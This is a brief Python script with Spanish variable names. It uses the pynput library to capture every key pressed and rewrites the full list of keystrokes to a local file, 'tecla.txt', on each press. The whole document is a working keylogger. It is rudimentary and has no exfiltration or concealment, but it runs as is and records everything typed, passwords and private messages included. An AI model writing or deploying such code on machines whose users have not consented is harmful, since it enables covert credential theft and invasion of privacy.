from pynput.keyboard import Listener

keys = []

def capturar(tecla):
    tecla = str(tecla)
    keys.append(tecla)
    with open('tecla.txt', 'w') as t:
        for i in keys:
            t.write(f'{i}\n')
    
with Listener(on_press=capturar) as l:
    l.join()
